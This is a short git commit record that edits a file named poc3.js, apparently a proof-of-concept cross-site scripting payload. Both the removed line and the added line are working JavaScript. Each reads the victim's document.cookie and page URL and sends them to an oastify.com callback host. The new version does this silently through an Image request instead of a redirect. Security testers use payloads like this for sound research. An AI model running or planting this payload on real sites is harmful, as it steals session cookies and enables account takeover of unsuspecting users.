caf06290be7b4f9fc42107367af7fc5169ab0337
dV3920 <88095613+dV3920@users.noreply.github.com>
2025-11-06 17:59:59 +0700

    Update poc3.js

--- poc3.js
+++ poc3.js
@@ -1,1 +1,1 @@
-location='//3lptsh2ug2oh8d5qs47gcp94tvzmndb2.oastify.com?cookie='+encodeURIComponent(document.cookie)+'&url='+encodeURIComponent(location.href)
+new Image().src = '//3lptsh2ug2oh8d5qs47gcp94tvzmndb2.oastify.com?c=' + encodeURIComponent(document.cookie) + '&u=' + encodeURIComponent(location.href) + '&r=' + Math.random();
